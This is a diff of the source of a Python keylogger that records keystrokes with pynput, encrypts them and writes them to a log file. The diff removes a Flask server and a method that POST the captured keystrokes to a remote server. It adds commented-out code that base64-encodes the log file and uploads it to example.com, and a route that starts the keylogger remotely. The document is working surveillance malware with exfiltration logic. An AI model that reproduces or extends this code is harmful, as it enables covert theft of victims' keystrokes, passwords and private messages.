@@ -5,41 +5,34 @@ from threading import Thread
 from pynput import keyboard
 import time
 
-from flask import Flask, request, jsonify
+from flask import Flask, request
 import requests
 
+# app = Flask(_name_)
 
-app = Flask(__name__)
-SERVER_LOG_FILE = "server_logs.txt"  #the file where logs are stored on the server
+# url = "https://example.com/upload"
 
-@app.route('/upload', methods=['POST'])
-def receive_log():
-    """Receive encrypted logs from keylogger and store them."""
-    data = request.json
-    timestamp = data.get("timestamp", "Unknown time")
-    encrypted_content = data.get("content", "")
+# @app.route('/get_file', methods=['GET'])
+# def upload_file():
+#     with open("encrypted_logs.txt", "rb") as f:
+#         encoded_content = base64.b64encode(f.read()).decode("utf-8")
+#     data = {"filename": "encrypted_logs.txt", "content": encoded_content}
+#     headers = {"Content-Type": "application/json"}
+#     response = requests.post(url, json=data, headers=headers)
+#     print(response.text)
+#     return 'Data received', 200
 
-    #save to the server file
-    with open(SERVER_LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"[{timestamp}] {encrypted_content}\n")
 
-    return jsonify({"message": "Log received successfully"}), 200
+# @app.route('/time_to_run/<value>', methods=['GET'])
+# def process(value):
+#     print(value)
+#     KeyLogger(int(value)).stop_after_time()
+#     return "KeyLogger started listening", 200
 
-@app.route('/get_logs', methods=['GET'])
-def get_logs():
-    """Retrieve all logs stored on the server."""
-    try:
-        with open(SERVER_LOG_FILE, "r", encoding="utf-8") as f:
-            logs = f.readlines()
-        return jsonify({"logs": logs}), 200
-    except FileNotFoundError:
-        return jsonify({"message": "No logs found"}), 404
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
 
 ENCRYPTED_LOG_FILE = "encrypted_logs.txt"
 ENCRYPTION_KEY = "613".encode('utf-8')
+
 
 class KeyLogger:
     def __init__(self, routing: str = 'file'):
@@ -103,31 +96,15 @@ class KeyLogger:
 
 
 class Writer:
-    SERVER_URL = "http://localhost:5000/upload"  #change if ger an acual server
-    
     @classmethod
-    def file_writing(cls, encrypted_content: str):
+    def add_writing(cls, encrypted_content: str):
         log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
         with open(ENCRYPTED_LOG_FILE, "a", encoding="utf-8") as f:
             f.write(f"[{log_time}] {encrypted_content}\n")
 
-    def server_writing(cls, encrypted_content: str):
-        """Send encrypted content to the server instead of writing to a file."""
-        log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
-        data = {
-            "timestamp": log_time,
-            "content": encrypted_content
-        }
-        headers = {"Content-Type": "application/json"}
+    def write_to_server(self):
+        pass
 
-        try:
-            response = requests.post(cls.SERVER_URL, json=data, headers=headers)
-            if response.status_code == 200:
-                print("Log successfully sent to server")
-            else:
-                print(f"Server error: {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"Failed to send log to server: {e}")
 
 class EncryptorDecryptor:
     @staticmethod
@@ -174,12 +151,9 @@ class Manager:
         self.key_logger.start(timer)
 
     @staticmethod
-
-    @staticmethod
     def encrypt(data: str):
         encrypted_string = EncryptorDecryptor.encrypt(data)
-        # Writer.file_writing(encrypted_string)
-        Writer.server_writing(encrypted_string)
+        Writer.add_writing(encrypted_string)
 
     @staticmethod
     def decrypt_log_file():
@@ -203,17 +177,13 @@ class Manager:
 
     @staticmethod
     def write(encrypted_string):
-        Writer.file_writing(encrypted_string) #need to find a way to apss
-     
-    @staticmethod
-    def server_write(encrypted_string):
-        Writer.server_writing(encrypted_string)
+        Writer.add_writing(encrypted_string)
 
     def route(self, routing='file'):
         self.key_logger.routing_to_save(routing)
 
 
-# __name__ == '__main__':
+# if _name_ == '_main_':
 # app.run(host='0.0.0.0', port=5000)
 #
 # m = Manager()
